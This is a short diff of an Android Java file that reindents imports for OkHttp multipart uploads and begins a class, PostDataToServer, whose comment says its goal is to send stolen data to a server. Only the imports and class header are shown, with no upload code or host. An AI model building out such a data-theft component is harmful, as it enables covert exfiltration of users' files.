@@ -1,15 +1,15 @@
 package com.example.myapplication;
 
-        import android.os.AsyncTask;
+import android.os.AsyncTask;
 
-        import java.io.File;
+import java.io.File;
 
-        import okhttp3.MediaType;
-        import okhttp3.MultipartBody;
-        import okhttp3.OkHttpClient;
-        import okhttp3.Request;
-        import okhttp3.RequestBody;
-        import okhttp3.Response;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
 public class PostDataToServer extends AsyncTask<File, Void, String> {
     // This thread's goal is to send the stolen data to the server.
